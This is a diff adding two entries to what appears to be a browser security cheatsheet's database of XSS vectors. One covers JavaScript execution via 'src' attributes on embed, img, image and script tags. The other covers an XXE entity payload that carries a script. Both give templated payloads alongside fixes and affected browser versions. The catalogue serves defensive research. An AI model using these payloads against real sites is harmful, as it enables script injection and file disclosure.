@@ -1968,5 +1968,75 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'attribute', 'simulating', 'parser', 'regex'],
         'reporter'   : 'Algol, LeverOne, White Jordan'
+    },    
+	{ /* ID 63 - JavaScript execution via src attribute */
+        'id'         : 63,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'JavaScript execution via src attribute',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<embed src="%js_uri_alert%">\r\n<img src="%js_uri_alert%">\r\n<image src="%js_uri_alert%">\r\n<script src="%js_uri_alert%">',
+        'description': {
+            'en' : 'Most browsers allow executing JavaScript via <IFRAME> "src" attributes - this is expected behavior. Interesting is though that this can be extended to other tags too. Opera 10, Chrome and Firefox execute JavaScript by using the <EMBED> tag while Opera 10 and Opera Mobile even execute JavaScript with <SCRIPT>, <IMG> and <IMAGE> and a matching "src" attribute as well as early Internet Explorer versions.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : 'Make sure "src" attributes can never contain non-HTTP-URLs to prevent XSS or worse.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'firefox': ['1.5', '2.x', '3.x'],
+			'chrome': ['4.x', '5.x'],
+            'opera': ['8.x', '9.x', '10.0', 'mobile'],
+            'internet explorer': ['6.0', '7.0'],
+			'safari': ['3.x', '4.x']
+        },
+        'tags'       : ['xss', 'javascript', 'src', 'safari', 'chrome', 'opera', 'firefox', 'internet explorer'],
+        'reporter'   : '.mario'
+    },    
+    { /* ID 64 - Arbitrary payload injection via XML External Entities (XXE) */
+        'id'         : 64,
+        'category'   : 'xml', 
+        'name'       : {
+            'en' : 'Arbitrary payload injection via XML External Entities (XXE)',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<!DOCTYPE x[<!ENTITY x SYSTEM "%xxe_path%">]><y>&x;</y>',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '1',            
+            'path'          : '',
+            'name'          : '',
+            'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml">%js_alert%</script>'
+        },
+        'description': {
+            'en' : 'Chrome and Safari allow using external XML entities to reference payload for an entity. The example shows that the entity &x; is now being filled with the content of the given file. The document must be delivered as XML or XHTML.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : ['http://xmlwriter.net/xml_guide/entity_declaration.shtml', 'http://www.w3.org/TR/REC-xml/'],
+        'howtofix'   : {
+            'en' : 'In case an attacker can inject data into the DOCTYPE area of the targeted website it\'s easy to fool filtering mechanisms since the actual payload is hidden in a harmless looking entity. Make sure no injections in that area are possible.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'chrome': ['3.x', '4.x', '5.x'],
+            'safari': ['3.x', '4.x']
+        },
+        'tags'       : ['xss', 'javascript', 'xxe', 'safari', 'chrome', 'xml', 'entities', 'doctype'],
+        'reporter'   : '.mario'
     }
 ]
